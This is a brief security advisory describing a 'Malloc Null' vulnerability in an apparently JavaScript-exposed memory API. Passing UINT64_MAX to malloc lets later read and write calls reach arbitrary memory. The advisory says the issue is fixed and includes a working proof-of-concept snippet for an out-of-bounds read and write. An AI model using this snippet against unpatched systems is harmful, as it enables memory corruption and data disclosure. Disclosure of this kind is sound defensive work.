# VID 003: Malloc Null

### Description

A attacker might be able to pass a arbitary size value to `memory.malloc` which causes allocation failure such as passing `0xFFFFFFFFFFFFFFFF` which is UINT64_MAX to the safety array and then use other methodes such as `memory.mwrite_buf_str` and `mread_buf_str` to read and write to and from arbitary memory addresses.

The vulnerability was addressed with improved checks and improved memory handling.

### Exploitation

```js
// initial vulnerability
// "allocating" a memory block with the size of UINT64_MAX
const ptr = memory.malloc(0xFFFFFFFFFFFFFFFF);

// allocating real memory block
const real_ptr = memory.malloc(0x01);

// writing a string to illegal memory bounds
memory.mwrite_buf_str(ptr, real_ptr - 10, real_ptr - 9, "\0");

// reading the string from illegal memory bounds
const buf = memory.mread_buf_str(ptr, real_ptr - 10, real_ptr -9);

// free the real memory block
memory.free(real_ptr);
```
